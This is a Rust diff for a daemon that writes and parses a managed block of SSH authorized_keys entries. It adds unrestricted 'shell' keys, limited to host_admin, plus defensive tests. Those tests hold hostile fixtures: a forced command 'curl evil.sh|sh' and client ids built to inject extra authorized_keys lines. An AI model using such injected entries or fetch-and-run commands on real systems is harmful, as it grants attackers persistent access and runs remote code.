@@ -53,10 +53,13 @@ pub struct Entry {
     /// `SHA256:…`, as `ssh-keygen -lf` prints it, or empty when the key did not
     /// parse at all.
     pub fingerprint: String,
-    /// The device this line enrolls, as the forced command names it — empty for
-    /// a foreign line.
+    /// The device this line enrolls, as the forced command names it — or, for a
+    /// plain line of ours, as its comment does. Empty for a foreign line.
     pub client_id: String,
     /// What that device may do, as the forced command names it.
+    ///
+    /// `Unspecified` for a plain line of ours: it carries no scope, and the
+    /// grant it confers is not one this daemon hands out. See `Grant::Shell`.
     pub scope: Scope,
     /// The key's comment, which for our own lines is the name `render` chose.
     pub label: String,
@@ -70,6 +73,14 @@ pub struct Entry {
     /// The line exactly as it was read, newline stripped, so a rewrite can put
     /// a foreign line back byte for byte.
     pub line: String,
+    /// This is a plain line of ours — Key B, the one Zed, git and Terminal use.
+    ///
+    /// Separate from `scope` rather than a fourth scope word, because the two
+    /// answer different questions: `scope` is what a Far Cooler session may ask
+    /// this daemon for, and no session ever arrives on a plain line at all.
+    /// `client.list` reports both so an app can show "Far Cooler access" and
+    /// "shell access" as two rows for one Mac.
+    pub shell_access: bool,
 }
 
 /// Why a fence could not be read or written.
@@ -195,13 +206,29 @@ fn entry_from_line(line: &str) -> Entry {
         label: key.map(|k| k.comment().to_string()).unwrap_or_default(),
         account: None,
         line: raw.to_string(),
+        shell_access: false,
     };
 
-    // A bare key with no options field is somebody else's: ours always carry a
-    // forced command. Parsing it anyway is worth doing, so the entry can still
-    // be reported by fingerprint rather than as an opaque string.
+    // A bare key with no options field is either somebody else's or a Key B of
+    // ours, and the comment is the only thing that can tell them apart — see
+    // `shell_comment`. Parsing a foreign one anyway is worth doing, so the entry
+    // can still be reported by fingerprint rather than as an opaque string.
     if let Ok(key) = ssh_key::PublicKey::from_openssh(raw) {
-        return foreign(Some(&key));
+        let comment = key.comment().to_string();
+        let Some(client_id) = shell_client_id(&comment) else { return foreign(Some(&key)) };
+        return Entry {
+            fingerprint: key.fingerprint(ssh_key::HashAlg::Sha256).to_string(),
+            client_id: client_id.to_string(),
+            // Not `HostAdmin`, though a shell is every power this account has:
+            // the scope on an entry is what a session arriving on it may ask
+            // this daemon for, and no session can arrive on a line with no
+            // forced command. `shell_access` is what says what it does grant.
+            scope: Scope::Unspecified,
+            label: comment.clone(),
+            account: None,
+            line: raw.to_string(),
+            shell_access: true,
+        };
     }
     let Some((options, rest)) = split_options(raw) else { return foreign(None) };
     let Ok(key) = ssh_key::PublicKey::from_openssh(rest) else { return foreign(None) };
@@ -225,7 +252,36 @@ fn entry_from_line(line: &str) -> Entry {
         label: key.comment().to_string(),
         account: None,
         line: raw.to_string(),
+        shell_access: false,
     }
+}
+
+/// The device a plain line of ours belongs to, out of its comment.
+///
+/// A plain line has no options field, so there is nowhere to put a forced
+/// command and therefore nowhere to put `--client`. The comment is the only
+/// field left, which is why `shell_comment` writes the id into it and why this
+/// reads it back — without which `client.list` could not group a Mac's two keys
+/// and `client.revoke` could not remove them together.
+///
+/// **The id here is never an identity claim.** A comment is not authenticated by
+/// anything, and this one is not asked to be: it is read only to decide which
+/// lines a revocation deletes and which rows a list groups. It cannot become a
+/// session's client id, because sshd runs a shell on this line and no Far Cooler
+/// session arrives on it at all.
+///
+/// The shape is checked, not merely the prefix. An id `render` would have
+/// refused is an id `render` did not write, and adopting such a line would put
+/// somebody's hand-added key inside the set `revoke` deletes.
+fn shell_client_id(comment: &str) -> Option<&str> {
+    // The first dot, because the readable half cannot contain one — a label is
+    // filtered to alphanumerics, `_` and `-`, and a base64 fingerprint has no
+    // dot either — while a client id may, and must come back whole.
+    let (readable, client_id) = comment.split_once('.')?;
+    if !readable.starts_with(SHELL_COMMENT) {
+        return None;
+    }
+    usable_client_id(client_id).then_some(client_id)
 }
 
 /// Split a line's options field from the key it precedes.
@@ -297,6 +353,8 @@ pub enum Rejected {
     ClientId,
     /// The caller did not say what the device may do.
     Unscoped,
+    /// A plain line was asked for at a scope below `host_admin`.
+    ShellScope,
 }
 
 impl std::fmt::Display for Rejected {
@@ -307,8 +365,46 @@ impl std::fmt::Display for Rejected {
             Self::Unparseable => "not a public key",
             Self::ClientId => "not a usable client id",
             Self::Unscoped => "no scope",
+            Self::ShellScope => "a shell key below host_admin",
         })
     }
+}
+
+/// What a line is FOR, which is what decides its shape.
+///
+/// **A Mac needs two keys, and this is the difference between them.** A forced
+/// command is what makes a device's identity server-asserted — the id was
+/// written here by whoever enrolled the key, and the connecting device never
+/// sends it and cannot change it — but it also means sshd runs that program and
+/// only that program, so `apps/macos/Sources/FarCooler/Editors.swift` opening a
+/// worktree as `ssh://{host}{path}` gets the daemon where Zed wanted a shell.
+/// Remove the forced command and there is nowhere left to put the client id.
+/// Both keys, or neither works.
+///
+/// An earlier rule said "only a shell can grant a shell", enforced by having no
+/// way to ask for a plain line at all. **That rule is relaxed here, and the
+/// design document it came from already says why it can be:** a `control` device
+/// drives a terminal and a terminal can run `echo … >> ~/.ssh/authorized_keys`,
+/// so refusing plain lines never stopped an attacker — it stopped an accident.
+/// See "What `control` really means" in
+/// `docs/superpowers/specs/2026-08-16-device-onboarding-design.md`.
+///
+/// What is kept is everything the guard rail was actually worth: `host_admin`
+/// and nothing less, one closed choice of two shapes rather than a field that
+/// carries bytes, the same parse-and-re-serialize path for both, and — the point
+/// of doing it here at all — the plain line lands INSIDE the fence, so
+/// `client.list` reports it and `client.revoke` removes it. A shell key smuggled
+/// in through a terminal is managed by nobody.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Grant {
+    /// Key A: `restrict`, a forced command, and a scope. What the app and the
+    /// CLI use, and the only kind a phone ever gets.
+    FarCooler,
+    /// Key B: a plain, unrestricted line. What Zed, git and Terminal use.
+    ///
+    /// It is a shell on this account, which is every power the account has, so
+    /// it is written only at `host_admin` — see `render`.
+    Shell,
 }
 
 /// Turn a received public key into the one line this runner will enroll.
@@ -328,11 +424,20 @@ impl std::fmt::Display for Rejected {
 /// KEEPS the comment it parsed, so "trailing garbage fails to parse" is false —
 /// trailing text is a valid comment. Rebuilding from `key_data()` is the only
 /// thing that actually regenerates it.
+///
+/// A plain line of ours is `Grant::Shell`, and `scope` must be `HostAdmin` for
+/// one: an unrestricted line on this account is a shell, and a shell is every
+/// power the account has, so a request that asks for one while saying `read` or
+/// `control` does not agree with itself. The caller's OWN scope is checked in
+/// `rpc` — `client.enroll` has always required `host_admin` — and this is the
+/// second half of that: the field a UI fills in for Key A cannot be passed
+/// through unchanged and quietly produce Key B.
 pub fn render(
     received: &str,
     label: &str,
     client_id: &str,
     scope: Scope,
+    grant: Grant,
 ) -> Result<String, Rejected> {
     if received.contains(['\r', '\n']) {
         return Err(Rejected::MultiLine);
@@ -341,21 +446,26 @@ pub fn render(
     // it is a second way to smuggle a line in: an id containing `"` closes the
     // command and turns the rest of the line into a key of the attacker's
     // choosing, and one containing a space breaks the flag the daemon reads
-    // back. This is not a name a person types — it identifies a device — so
-    // refusing an unusable one costs nothing.
-    if client_id.is_empty()
-        || client_id.len() > 64
-        || !client_id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
-    {
+    // back. On a plain line it lands in the comment instead, which runs to the
+    // end of the line — a different field, the same two ways to end it early.
+    // One charset for both, so neither drifts. This is not a name a person
+    // types — it identifies a device — so refusing an unusable one costs
+    // nothing.
+    if !usable_client_id(client_id) {
         return Err(Rejected::ClientId);
     }
-    // A scope of `Unspecified` is what a caller that set no scope field sends,
-    // and it ranks BELOW read everywhere else in this daemon — `rpc::satisfies`
-    // grants it nothing. Writing it as host_admin, which is what an unscoped
-    // line already means to sshd, would turn a forgotten field into the whole
-    // runner. Refusing is the only reading that cannot escalate.
-    if matches!(scope, Scope::Unspecified) {
-        return Err(Rejected::Unscoped);
+    match grant {
+        // A scope of `Unspecified` is what a caller that set no scope field
+        // sends, and it ranks BELOW read everywhere else in this daemon —
+        // `rpc::satisfies` grants it nothing. Writing it as host_admin, which is
+        // what an unscoped line already means to sshd, would turn a forgotten
+        // field into the whole runner. Refusing is the only reading that cannot
+        // escalate.
+        Grant::FarCooler if matches!(scope, Scope::Unspecified) => {
+            return Err(Rejected::Unscoped);
+        }
+        Grant::Shell if !matches!(scope, Scope::HostAdmin) => return Err(Rejected::ShellScope),
+        _ => {}
     }
 
     let parsed = ssh_key::PublicKey::from_openssh(received).map_err(|e| {
@@ -368,20 +478,42 @@ pub fn render(
     }
 
     let fingerprint = parsed.fingerprint(ssh_key::HashAlg::Sha256).to_string();
-    let key = ssh_key::PublicKey::new(parsed.key_data().clone(), comment_for(label, &fingerprint));
+    let comment = match grant {
+        Grant::FarCooler => comment_for(label, &fingerprint),
+        Grant::Shell => shell_comment(label, &fingerprint, client_id),
+    };
+    let key = ssh_key::PublicKey::new(parsed.key_data().clone(), comment);
     let body = key.to_openssh().map_err(|e| {
         tracing::debug!(error = %e, "a parsed key could not be re-encoded");
         Rejected::Unparseable
     })?;
-    let line = format!(
-        "restrict,command=\"farcoolerd --stdio --client {client_id} --scope {}\" {body}",
-        scope_word(scope)
-    );
+    let line = match grant {
+        Grant::FarCooler => format!(
+            "restrict,command=\"farcoolerd --stdio --client {client_id} --scope {}\" {body}",
+            scope_word(scope)
+        ),
+        // No options field at all, which is the entire difference: sshd gives
+        // this key a shell, so Zed, git and Terminal work. The key material and
+        // the comment are still rebuilt above, so a plain line is not a way to
+        // write bytes a restricted line would have refused.
+        Grant::Shell => body,
+    };
     // Not an assertion about the input — every part of this line is now
-    // something this function built — but about the three rules above still
-    // holding together if one of them is ever edited.
+    // something this function built — but about the rules above still holding
+    // together if one of them is ever edited.
     debug_assert!(!line.contains(['\r', '\n']));
     Ok(line)
+}
+
+/// A client id that survives being written into a line and read back out of it.
+///
+/// One predicate for both directions and both shapes: `render` refuses what it
+/// cannot write, and `shell_client_id` refuses to adopt a plain line carrying an
+/// id `render` would not have written.
+fn usable_client_id(client_id: &str) -> bool {
+    !client_id.is_empty()
+        && client_id.len() <= 64
+        && client_id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
 }
 
 /// The key is the identity; the comment is a label for humans.
@@ -390,12 +522,38 @@ pub fn render(
 /// and renaming a phone must not collide with another. The fingerprint suffix
 /// is what makes the comment unique; the name is what makes it readable.
 fn comment_for(label: &str, fingerprint: &str) -> String {
+    format!("farcooler-{}", readable(label, fingerprint))
+}
+
+/// What says a plain line is one of ours, and whose it is.
+///
+/// A plain line has no options field, so this comment is the only field it has:
+/// it carries the marker that makes the line MANAGED — without it a Key B would
+/// be indistinguishable from a key somebody added by hand, and `client.revoke`
+/// must never delete one of those — and the device id, so that revoking a Mac
+/// removes both of its keys in one write rather than in two calls that can half
+/// fail.
+///
+/// The dot is the delimiter because the readable half cannot contain one: a
+/// label is filtered to alphanumerics, `_` and `-`, and a base64 fingerprint has
+/// no dot either. A client id may contain dots, and splitting at the FIRST one
+/// hands the whole id back whatever it contains.
+fn shell_comment(label: &str, fingerprint: &str, client_id: &str) -> String {
+    format!("{SHELL_COMMENT}{}.{client_id}", readable(label, fingerprint))
+}
+
+/// The prefix every plain line of ours carries, and the only thing a person
+/// reading `authorized_keys` needs to see to know which key is which.
+const SHELL_COMMENT: &str = "farcooler-shell-";
+
+/// A filtered name and a short fingerprint: the half of a comment a human reads.
+fn readable(label: &str, fingerprint: &str) -> String {
     let keep = |c: char| if c.is_ascii_alphanumeric() || c == '_' { c } else { '-' };
     let safe: String = label.chars().map(keep).collect();
     let safe = safe.trim_matches('-');
     let safe = if safe.is_empty() { "device" } else { safe };
     let short: String = fingerprint.trim_start_matches("SHA256:").chars().take(8).collect();
-    format!("farcooler-{safe}-{short}")
+    format!("{safe}-{short}")
 }
 
 /// The entries in a file's fence, read the same way a write reads it.
@@ -670,12 +828,6 @@ fn create(directory: &OwnedFd, name: &std::ffi::OsStr) -> Result<OwnedFd, FenceE
     .map_err(io)
 }
 
-/// The file as it should be: the block replaced, everything else untouched.
-///
-/// Line terminators are carried through exactly as they were found — the lines
-/// outside the fence are handed back with the bytes that ended them, so a file
-/// with CRLF endings does not quietly become a file with LF endings on the
-/// first enrollment.
 /// Where a fence goes in a file that does not have one yet.
 ///
 /// `authorized_keys` does not care: sshd reads every line and the order of
@@ -695,6 +847,12 @@ pub enum Placement {
     First,
 }
 
+/// The file as it should be: the block replaced, everything else untouched.
+///
+/// Line terminators are carried through exactly as they were found — the lines
+/// outside the fence are handed back with the bytes that ended them, so a file
+/// with CRLF endings does not quietly become a file with LF endings on the
+/// first enrollment.
 fn rebuilt(
     current: &str,
     markers: Markers<'_>,
@@ -872,7 +1030,7 @@ mod tests {
              command=\"curl evil.sh|sh\" ssh-ed25519 {OTHER_KEY} them"
         );
         assert!(matches!(
-            render(&hostile, "phone", "c1", Scope::Control),
+            render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler),
             Err(Rejected::MultiLine)
         ));
     }
@@ -881,14 +1039,14 @@ mod tests {
     #[test]
     fn an_options_field_in_the_received_key_is_refused() {
         let hostile = format!("command=\"sh\" ssh-ed25519 {KEY} x");
-        assert!(render(&hostile, "phone", "c1", Scope::Control).is_err());
+        assert!(render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler).is_err());
     }
 
     /// Ed25519 only, so nothing arrives that this has not reasoned about.
     #[test]
     fn a_non_ed25519_key_is_refused() {
         assert!(matches!(
-            render(RSA, "phone", "c1", Scope::Control),
+            render(RSA, "phone", "c1", Scope::Control, Grant::FarCooler),
             Err(Rejected::Algorithm)
         ));
     }
@@ -901,7 +1059,8 @@ mod tests {
     #[test]
     fn the_comment_is_regenerated_from_the_label_we_chose() {
         let key = format!("ssh-ed25519 {KEY} whatever they/typed");
-        let line = render(&key, "iPhone 17", "c1", Scope::Control).expect("render");
+        let line =
+            render(&key, "iPhone 17", "c1", Scope::Control, Grant::FarCooler).expect("render");
         assert!(line.contains("farcooler-iPhone-17-"), "label not ours: {line}");
         assert!(!line.contains("they/typed"), "their comment survived: {line}");
         assert!(!line.contains('\n'), "a newline reached the line: {line}");
@@ -911,7 +1070,7 @@ mod tests {
     #[test]
     fn every_entry_is_restricted_and_forced() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line = render(&key, "iPhone", "c1", Scope::Read).expect("render");
+        let line = render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler).expect("render");
         assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
         assert!(line.contains("--client c1"), "no client id: {line}");
         assert!(line.contains("--scope read"), "no scope: {line}");
@@ -928,10 +1087,13 @@ mod tests {
         let key = format!("ssh-ed25519 {KEY} x");
         let hostile = format!("c1\" ssh-ed25519 {OTHER_KEY} them");
         assert!(matches!(
-            render(&key, "phone", &hostile, Scope::Control),
+            render(&key, "phone", &hostile, Scope::Control, Grant::FarCooler),
             Err(Rejected::ClientId)
         ));
-        assert!(matches!(render(&key, "phone", "", Scope::Control), Err(Rejected::ClientId)));
+        assert!(matches!(
+            render(&key, "phone", "", Scope::Control, Grant::FarCooler),
+            Err(Rejected::ClientId)
+        ));
     }
 
     /// An unspecified scope is a field somebody forgot, not a request for all of it.
@@ -939,7 +1101,7 @@ mod tests {
     fn an_unscoped_enrollment_is_refused_rather_than_granted_everything() {
         let key = format!("ssh-ed25519 {KEY} x");
         assert!(matches!(
-            render(&key, "phone", "c1", Scope::Unspecified),
+            render(&key, "phone", "c1", Scope::Unspecified, Grant::FarCooler),
             Err(Rejected::Unscoped)
         ));
     }
@@ -948,7 +1110,7 @@ mod tests {
     #[test]
     fn a_rendered_line_round_trips() {
         let key = format!("ssh-ed25519 {KEY} x");
-        let line = render(&key, "iPhone", "c1", Scope::Control).expect("render");
+        let line = render(&key, "iPhone", "c1", Scope::Control, Grant::FarCooler).expect("render");
         let text = format!("{BEGIN}\n{line}\n{END}\n");
         let entries = parse(&text).expect("parse");
         assert_eq!(entries.len(), 1);
@@ -965,5 +1127,151 @@ mod tests {
         let entries = parse(&text).expect("parse");
         assert_eq!(entries.len(), 1);
         assert!(entries[0].client_id.is_empty(), "a foreign line claimed a client id");
+    }
+
+    // -----------------------------------------------------------------------
+    // Key B: the plain line
+    //
+    // A Mac needs two keys, and the second one is an ordinary SSH key, because
+    // Zed opens `ssh://{host}{path}` and a forced command has no shell to give
+    // it. See `Grant`.
+    // -----------------------------------------------------------------------
+
+    /// A plain line, with the device named in the only field it has.
+    #[test]
+    fn a_shell_line_is_plain_and_names_its_device_in_its_comment() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        let line =
+            render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell).expect("render");
+        assert!(line.starts_with("ssh-ed25519 "), "a shell line carried options: {line}");
+        assert!(!line.contains("restrict"), "a shell line was restricted: {line}");
+        assert!(!line.contains("command="), "a shell line carried a forced command: {line}");
+        assert!(line.contains("farcooler-shell-"), "nothing says Far Cooler wrote it: {line}");
+        assert!(line.ends_with(".mac-1"), "the device is not named: {line}");
+    }
+
+    /// It reads back as OURS — that is what makes it managed.
+    ///
+    /// And at no scope, because the line grants none: no Far Cooler session can
+    /// arrive on it, so reporting one would be reporting a grant that does not
+    /// exist. What it grants is a shell, which is what `shell_access` says.
+    #[test]
+    fn a_shell_line_round_trips_as_ours_and_claims_no_scope() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        let line =
+            render(&key, "MacBook Air", "mac.1_2", Scope::HostAdmin, Grant::Shell).expect("render");
+        let entries = parse(&format!("{BEGIN}\n{line}\n{END}\n")).expect("parse");
+        assert_eq!(entries.len(), 1);
+        // A dotted id on purpose: the comment's own delimiter is a dot, and an
+        // id that contains one must still come back whole.
+        assert_eq!(entries[0].client_id, "mac.1_2");
+        assert!(entries[0].shell_access, "a plain line of ours was not reported as shell access");
+        assert_eq!(entries[0].scope, Scope::Unspecified);
+        assert!(entries[0].fingerprint.starts_with("SHA256:"));
+    }
+
+    /// A restricted line is not shell access, and says so.
+    #[test]
+    fn a_restricted_line_is_not_reported_as_shell_access() {
+        let entries = parse(&one()).expect("parse");
+        assert!(!entries[0].shell_access, "a forced-command line offered a shell");
+    }
+
+    /// The comment is the only field a plain line has, so it is regenerated too.
+    #[test]
+    fn a_shell_line_gets_our_comment_rather_than_theirs() {
+        let key = format!("ssh-ed25519 {KEY} whatever they/typed");
+        let line = render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell)
+            .expect("render");
+        assert!(!line.contains("they/typed"), "their comment survived: {line}");
+        // Their comment is where the device id goes, so a comment carried
+        // through verbatim would also be a way to claim another device's id.
+        assert_eq!(line.matches('.').count(), 1, "more than one delimiter: {line}");
+    }
+
+    /// Every refusal a restricted line makes, a plain line makes too.
+    ///
+    /// The point of rendering both through one function: a plain line must not
+    /// become a way to smuggle bytes that a restricted line refuses.
+    #[test]
+    fn hostile_key_bytes_are_refused_for_a_plain_line_exactly_as_for_a_restricted_one() {
+        let admin = Scope::HostAdmin;
+        let smuggled = format!("ssh-ed25519 {KEY} ok\nssh-ed25519 {OTHER_KEY} them");
+        assert!(matches!(
+            render(&smuggled, "mac", "mac-1", admin, Grant::Shell),
+            Err(Rejected::MultiLine)
+        ));
+        let with_options = format!("command=\"sh\" ssh-ed25519 {KEY} x");
+        assert!(render(&with_options, "mac", "mac-1", admin, Grant::Shell).is_err());
+        assert!(matches!(
+            render(RSA, "mac", "mac-1", admin, Grant::Shell),
+            Err(Rejected::Algorithm)
+        ));
+        assert!(matches!(
+            render("not a key at all", "mac", "mac-1", admin, Grant::Shell),
+            Err(Rejected::Unparseable)
+        ));
+
+        // The id lands in the comment, which runs to the end of the line, so an
+        // id with a space in it is a second entry's worth of text — and an id
+        // that could close a quote is refused here too even though this line
+        // has no quotes, because one charset for both shapes is the only way
+        // neither drifts.
+        let key = format!("ssh-ed25519 {KEY} x");
+        for hostile in ["", "mac 1", "mac\"1", &format!("mac\nssh-ed25519 {OTHER_KEY} them")] {
+            assert!(
+                matches!(
+                    render(&key, "mac", hostile, admin, Grant::Shell),
+                    Err(Rejected::ClientId)
+                ),
+                "a hostile client id was accepted for a plain line: {hostile:?}"
+            );
+        }
+    }
+
+    /// A plain line is host_admin or nothing.
+    ///
+    /// An unrestricted line IS a shell, and a shell on this account is every
+    /// power the account has — so a request that asks for one while saying
+    /// `read` or `control` is incoherent, and the coherent reading of it is a
+    /// mistake. The caller's own scope is checked in `rpc`; this is the request
+    /// agreeing with itself.
+    #[test]
+    fn a_plain_line_below_host_admin_is_refused() {
+        let key = format!("ssh-ed25519 {KEY} x");
+        for scope in [Scope::Read, Scope::Control, Scope::Unspecified] {
+            assert!(
+                matches!(
+                    render(&key, "mac", "mac-1", scope, Grant::Shell),
+                    Err(Rejected::ShellScope)
+                ),
+                "a plain line was rendered at {scope:?}"
+            );
+        }
+    }
+
+    /// A plain line whose comment we could not have written is still foreign.
+    ///
+    /// The comment is what says a plain line is managed, so the shape of it is
+    /// load-bearing: an id that `render` would have refused is an id `render`
+    /// did not write, and adopting it would put a stranger's line inside the
+    /// set that `revoke` deletes.
+    #[test]
+    fn a_plain_line_whose_comment_we_could_not_have_written_stays_foreign() {
+        for comment in [
+            "someone@laptop",
+            "farcooler-shell-mac-aaaaaaaa",   // no device at all
+            "farcooler-shell-mac-aaaaaaaa.",  // a device that is empty
+            "farcooler-mac-aaaaaaaa.mac-1",   // not the shell prefix
+            "shell-mac-aaaaaaaa.mac-1",
+        ] {
+            let text = format!("{BEGIN}\nssh-ed25519 {OTHER_KEY} {comment}\n{END}\n");
+            let entries = parse(&text).expect("parse");
+            assert_eq!(entries.len(), 1);
+            assert!(
+                entries[0].client_id.is_empty() && !entries[0].shell_access,
+                "{comment} was adopted as ours"
+            );
+        }
     }
 }
